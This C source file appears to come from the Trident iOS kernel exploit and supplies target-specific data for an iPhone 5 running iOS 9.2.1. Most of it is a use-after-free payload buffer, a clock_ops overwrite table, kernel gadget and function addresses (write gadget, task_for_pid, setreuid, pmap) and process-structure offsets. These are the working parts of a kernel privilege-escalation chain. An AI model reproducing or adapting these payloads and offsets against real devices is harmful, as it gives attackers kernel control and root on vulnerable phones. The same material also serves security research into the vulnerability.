//
//  target_iphone_5_2_ios_9_2_1.c
//  Trident
//
//  Created by Simone Ferrini on 14/12/2016.
//  Copyright © 2016 Benjamin Randazzo. All rights reserved.
//

#include "target_iphone_5_2_ios_9_2_1.h"

static uint8_t clock_ops_overwrite[] = {
    0x69, 0x78, 0x31, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0x89, 0xeb, 0x01, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
    0xdd, 0xd9, 0x0d, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};

static uint8_t uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0xdc, 0x33, 0x40, 0x00, // [04] address of clock_ops array in kern memory
    0x7c, 0xa8, 0x0c, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x69, 0x78, 0x31, 0x00, // [10] address of OSSerializer::serialize (+1)
    0xde, 0xd9, 0x0d, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0xa1, 0x9f, 0x31, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0xde, 0xd9, 0x0d, 0x00, // [20] address of "BX LR" code fragment
    0xde, 0xd9, 0x0d, 0x00, // [24] address of "BX LR" code fragment
};

static uint32_t addresses_pool[] = {
    0x000ca5a8, // WRITE_GADGET // address of "str r1, [r0, #0xc] ; bx lr"
    0x003f6444, // PMAP
    0x000be610, // FLUSH_DCACHE
    0x000ca600, // INVALIDATE_TLB
    0x002fbc9c, // TFP
    0x002a9f34, // SETREUID
    0x00317869, // SERIALIZE
    0x00455968, // ADDRPERM
};

static uint32_t check_offsets_pool[] = {
    0x16, // PID
    0x3e, // POSIX
    0x1e6, // MAC_PROC
};

void target_iphone_5_2_ios_9_2_1_init(target_t *t)
{
    t->clock_ops_overwrite = clock_ops_overwrite;
    t->clock_ops_overwrite_size = sizeof(clock_ops_overwrite);
    
    t->uaf_payload_buffer = uaf_payload_buffer;
    t->uaf_payload_buffer_size = sizeof(uaf_payload_buffer);
    
    t->addresses_pool = addresses_pool;
    t->check_offsets_pool = check_offsets_pool;
}
